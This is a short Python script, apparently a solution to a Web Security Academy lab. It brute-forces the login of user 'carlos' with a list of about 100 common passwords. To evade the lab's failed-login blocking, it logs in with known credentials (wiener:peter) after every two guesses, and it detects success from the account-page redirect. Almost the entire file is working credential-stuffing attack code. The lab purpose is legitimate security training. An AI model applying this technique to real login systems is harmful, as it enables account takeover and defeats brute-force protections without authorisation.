import requests

url:list[str] = [
    "https://0ac3002403ff95d680053a82009700d5.web-security-academy.net/login", 
    "https://0ac3002403ff95d680053a82009700d5.web-security-academy.net/logout"                    
]

password:list[str] = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

data = {
    "username":"wiener",
    "password":"peter"
}

targetData = {
    "username":"carlos",
    "password":""
}

valid:str = "https://0ac3002403ff95d680053a82009700d5.web-security-academy.net/my-account?id=wiener"
target:str = "https://0ac3002403ff95d680053a82009700d5.web-security-academy.net/my-account?id=carlos"


response = ""

def main():
    count = 1
    for i in range(len(password)):
        print(f"Current password: {password[i]}, count: {count}")
        if count == 3:
            response = requests.post(url[0], data)
            response = requests.post(url[1])
            count = 1
        
        targetData.update({"password":password[i]})
        response = requests.post(url[0], targetData)
        if response.url == target:
            print(f"\n\n\nPassword is found: {password[i]}")
            break
        count+=1

if __name__ == "__main__":
    # response = requests.post(url[0], data)
    # print(response.url)
    # response = requests.post(url[1])
    # print(response.url)
    main()



